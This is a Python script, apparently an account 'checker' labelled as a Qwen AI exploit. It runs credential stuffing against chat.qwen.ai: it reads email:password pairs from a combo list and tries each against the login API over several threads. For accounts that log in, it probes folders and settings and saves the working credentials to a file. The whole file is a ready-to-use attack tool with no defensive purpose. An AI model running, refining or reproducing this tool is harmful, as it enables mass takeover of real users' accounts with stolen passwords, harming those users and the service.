import hashlib
import json
import requests
import os
import time
from datetime import datetime
import sys
from concurrent.futures import ThreadPoolExecutor

# ANSI color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    BLUE = '\033[94m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class QwenChecker:
    def __init__(self):
        self.valid_accounts = []
        self.tested = 0
        self.base_url = "https://chat.qwen.ai"
        self.timeout = 30
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json"
        }
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def print_banner(self):
        self.clear_screen()
        banner = f"""
{Colors.BLUE}╔══════════════════════════════════════════════════╗
║                                                      ║
║  {Colors.MAGENTA}Alibaba Qwen AI Exploit v1.0{Colors.BLUE}             ║
║  {Colors.WHITE}Auto Exploit - {Colors.CYAN}DEV BY @RITHCYBER-TEAM{Colors.BLUE}          ║
║                                                      ║
╚══════════════════════════════════════════════════╝{Colors.RESET}
        """
        print(banner)
        
    def hash_password(self, password):
        return hashlib.sha256(password.encode()).hexdigest()
        
    def load_combos(self):
        if not os.path.exists("combo.txt"):
            print(f"\n{Colors.RED}[!] ERROR: combo.txt file not found!{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Please create combo.txt with email:password format{Colors.RESET}")
            input("\nPress Enter to exit...")
            sys.exit()
            
        with open("combo.txt", "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if ":" in line]
            
    def check_account(self, combo):
        email, password = combo.split(":", 1)
        self.tested += 1
        
        try:
            # Login
            payload = {
                "email": email,
                "password": self.hash_password(password)
            }
            
            response = requests.post(
                f"{self.base_url}/api/v1/auths/signin",
                json=payload,
                headers=self.headers,
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                token = response.json().get("token")
                if token:
                    # Check account features
                    headers = self.headers.copy()
                    headers["Authorization"] = f"Bearer {token}"
                    
                    # Check folders
                    folders_resp = requests.get(
                        f"{self.base_url}/api/v1/folders/",
                        headers=headers,
                        timeout=self.timeout
                    )
                    
                    # Check plan
                    plan_resp = requests.get(
                        f"{self.base_url}/api/v1/users/user/settings",
                        headers=headers,
                        timeout=self.timeout
                    )
                    
                    has_folders = folders_resp.status_code == 200
                    has_plan = plan_resp.status_code == 200
                    
                    if has_folders or has_plan:
                        account_info = {
                            "email": email,
                            "password": password,
                            "folders": has_folders,
                            "plan": has_plan
                        }
                        self.valid_accounts.append(account_info)
                        self.print_status(combo, True, has_folders, has_plan)
                        return True
                        
        except Exception:
            pass
            
        self.print_status(combo, False)
        return False
        
    def print_status(self, combo, is_valid, has_folders=False, has_plan=False):
        email = combo.split(":")[0]
        status = f"{Colors.GREEN}[VALID]{Colors.RESET}" if is_valid else f"{Colors.RED}[INVALID]{Colors.RESET}"
        print(f"{status} {email.ljust(40)} | Tested: {self.tested}", end="\r")
        
        if is_valid:
            print(f"\n{Colors.GREEN}[+] {email}")
            print(f"    ├─ Password: {combo.split(':')[1]}")
            print(f"    ├─ Folders: {'Yes' if has_folders else 'No'}")
            print(f"    └─ Plan: {'Yes' if has_plan else 'No'}{Colors.RESET}\n")
            
    def save_results(self):
        if not self.valid_accounts:
            return
            
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"qwen_valid_{timestamp}.txt"
        
        with open(filename, "w", encoding="utf-8") as f:
            for account in self.valid_accounts:
                f.write(f"Email: {account['email']}\n")
                f.write(f"Password: {account['password']}\n")
                f.write(f"Folders: {'Yes' if account['folders'] else 'No'}\n")
                f.write(f"Plan: {'Yes' if account['plan'] else 'No'}\n")
                f.write("-" * 50 + "\n")
                
        print(f"\n{Colors.GREEN}[+] Results saved to: {filename}{Colors.RESET}")
        
    def run(self):
        self.print_banner()
        combos = self.load_combos()
        
        if not combos:
            print(f"{Colors.RED}[!] No valid combos found in combo.txt{Colors.RESET}")
            input("\nPress Enter to exit...")
            return
            
        print(f"{Colors.CYAN}[*] Loaded {len(combos)} accounts from combo.txt{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Starting checking process...{Colors.RESET}\n")
        
        # Use threading for faster checking (adjust max_workers as needed)
        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(self.check_account, combos)
            
        self.save_results()
        
        print(f"\n{Colors.CYAN}[*] Checking completed!{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Valid accounts: {len(self.valid_accounts)}{Colors.RESET}")
        print(f"{Colors.RED}[-] Invalid accounts: {len(combos) - len(self.valid_accounts)}{Colors.RESET}")
        input("\nPress Enter to exit...")

if __name__ == "__main__":
    checker = QwenChecker()
    checker.run()